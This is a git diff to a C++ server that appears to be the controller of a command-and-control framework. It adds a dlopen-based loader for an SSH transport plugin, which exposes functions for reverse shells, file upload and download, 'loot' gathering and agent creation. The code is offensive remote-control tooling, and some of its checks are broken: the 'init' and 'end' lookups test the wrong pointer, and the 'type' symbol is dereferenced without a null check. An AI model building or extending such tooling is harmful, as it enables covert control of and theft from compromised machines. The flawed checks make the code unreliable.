@@ -291,46 +291,157 @@ std::queue<ConnectionInstance *> *Server::get_shell_queue(){
     return this->shell_queue;
 }
 
+ptransport_t init_transport(void *handle){
+    ptransport_t transport = (ptransport_t) malloc(sizeof(transport_t));
+    memset(transport, 0, sizeof(transport_t));
+
+    transport->send_ok = (int (*)())dlsym(handle, "send_ok");
+    if(!transport->send_ok){
+        printf("Failed to find function send_ok\n");
+        return nullptr;
+    }
+
+    transport->send_err = (int (*)())dlsym(handle, "send_err");
+    if(!transport->send_err){
+        printf("Failed to find function send_err\n");
+        return nullptr;
+    }
+
+    transport->listen = (int (*)())dlsym(handle, "listen");
+    if(!transport->listen){
+        printf("Failed to find function listen\n");
+        return nullptr;
+    }
+
+    transport->read = (int (*)(char **,int))dlsym(handle, "read");
+    if(!transport->read){
+        printf("Failed to find function read\n");
+        return nullptr;
+    }
+
+    transport->write = (int (*)(char*,int))dlsym(handle, "write");
+    if(!transport->write){
+        printf("Failed to find function write\n");
+        return nullptr;
+    }
+
+    transport->download_file = (int (*)(char *,int,char*))dlsym(handle, "download_file");
+    if(!transport->download_file){
+        printf("Failed to find function download_file\n");
+        return nullptr;
+    }
+
+    transport->get_loot = (int (*)(char*))dlsym(handle, "get_loot");
+    if(!transport->get_loot){
+        printf("Failed to find function get_loot\n");
+        return nullptr;
+    }
+
+    transport->upload_file = (int (*)(char*,int))dlsym(handle, "upload_file");
+    if(!transport->upload_file){
+        printf("Failed to find function upload_file\n");
+        return nullptr;
+    }
+
+    transport->get_info = (int (*)(char*))dlsym(handle, "get_info");
+    if(!transport->get_info){
+        printf("Failed to find function get_info\n");
+        return nullptr;
+    }
+
+    transport->init_reverse_shell = (int (*)(char *))dlsym(handle, "init_reverse_shell");
+    if(!transport->init_reverse_shell){
+        printf("Failed to find function init_reverse_shell\n");
+        return nullptr;
+    }
+
+    transport->determine_handler = (int (*)())dlsym(handle, "determine_handler");
+    if(!transport->determine_handler){
+        printf("Failed to find function determine_handler\n");
+        return nullptr;
+    }
+
+    transport->make_agent = (int (*)(char*,char*))dlsym(handle, "make_agent");
+    if(!transport->make_agent){
+        printf("Failed to find optional function make_agent. Ignoring\n");
+    }
+
+    transport->init = (int (*)(pClientDat))dlsym(handle, "init");
+    if(!transport->make_agent){
+        printf("Failed to find function init\n");
+        return nullptr;
+    }
+
+    transport->end = (int (*)())dlsym(handle, "end");
+    if(!transport->make_agent){
+        printf("Failed to find function end\n");
+        return nullptr;
+    }
+
+    return transport;
+}
+
 
 /*Funny enough, this is the main function*/
 int main(int argc, char **argv){
     // TODO: UPDATE SIGHANDLERS TO MODERN STUFF
 
-    // set up signal handlers
-    //struct sigaction sigIntHandler;
-	//struct sigaction sigTermHandler;
-
-
-	//sigIntHandler.sa_handler = handleTerm;
-   	//sigemptyset(&sigIntHandler.sa_mask);
-   	//sigIntHandler.sa_flags = 0;
-
-	//sigTermHandler.sa_handler = handleTerm;
-	//sigemptyset(&sigTermHandler.sa_mask);
-	//sigTermHandler.sa_flags = 0;
-
-   	//sigaction(SIGINT, &sigIntHandler, NULL);
-    //sigaction(SIGTERM, &sigTermHandler, NULL);
-    
     // initialize variables
     Server *server = new Server();
+
+    // Example load .so transport
+    void *handle = dlopen("./shared/ssh_transport.so", RTLD_LAZY);
+    if(!handle) {
+        printf("failed to load .so file\n");    
+        return -1;
+    }
+    
+    int type = *(int *)dlsym(handle, "type");
+    if(!type) {
+        printf("Failed to find type symbol!\n");
+        return 1;
+    }
+    else printf("Detected type of object: %d\n", type);
+
+    ptransport_t transport;
+    class ConnectionInstance *instance;
+    void (*entrypoint)();
+
+    switch(type){
+        case MODULE:
+            printf("Detected module type\n");
+            
+            entrypoint = (void (*)())dlsym(handle, "entrypoint");
+            if (!entrypoint){
+                printf("Failed to locate the module's entrypoint function");
+                return 1;
+            }
+            (*entrypoint)();
+            break;
+        case TRANSPORT:
+            printf("Detected transport type\n");
+            transport = init_transport(handle);
+            if(!transport) return 1;
+            instance = new ConnectionInstance(server);
+            instance->set_transport(transport);
+            server->add_instance(instance);
+            server->listen_instance(0);
+            break;
+
+        default:
+            printf("Unknown type: %d\n", type);
+            return 1;
+
+    }
     
     // initialize the controller socket
-    ConnectionInstance *instance = new ConnectionInstance(server);
-    ServerTransport *def_transport = new Ssh_Transport(instance);
+    //ConnectionInstance *instance = new ConnectionInstance(server);
+    //ServerTransport *def_transport = new Ssh_Transport(instance);
 
-    instance->set_transport(def_transport);
-    server->add_instance(instance);
-    server->listen_instance(0);
+    //instance->set_transport(def_transport);
+    //server->add_instance(instance);
+    //server->listen_instance(0);
     
-/*   
-#ifdef HAVE_ARGP_H
-    
-    argp_parse (&argp, argc, argv, 0, 0, sshbind);
-#else
-    (void) argc;
-    (void) argv;
-#endif*/
 
     
     // accept connections
@@ -339,14 +450,6 @@ int main(int argc, char **argv){
     while(1){
         sleep(1);
     }
-        
-        
-    //for (size_t i = 0; i < ctr; i++){
-      //  if(pthread_join(thread_array[i], NULL)){
-        //    printf("Failed to join thread at index %lu\n", i);
-    //    }
-    //}
-
     
     printf("Server: Terminated successfully\n");
     return 0;
